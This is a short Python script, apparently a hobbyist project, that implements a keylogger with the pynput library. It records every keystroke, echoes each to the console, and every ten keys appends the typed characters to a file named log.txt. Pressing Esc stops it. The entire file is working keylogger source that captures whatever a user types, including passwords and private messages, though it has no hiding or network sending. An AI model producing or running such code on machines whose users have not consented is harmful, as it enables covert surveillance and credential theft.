from pynput.keyboard import Key, Listener

count = 0
keys = []

"""function for pressing the keyloger"""


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} printed".format(key))

    if count >= 10:
        count = 0
        write_file(str(keys))
        keys = []


"""function to write into a text file"""


def write_file(key):
    with open("log.txt", 'a') as file:
        for key in keys:
            latter = str(key)
            latter = latter.replace("'", '')
            latter = latter.replace("[", '')
            latter = latter.replace("]", '')
            latter = latter.replace(",", '')

            if latter.find("space") > 0:
                file.write(' ')
            elif latter.find("Key") == -1:
                file.write(latter)


"""function for releaseing the pressed button"""


def on_release(key):
    if key == Key.esc:
        return False


"""Listener function"""
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


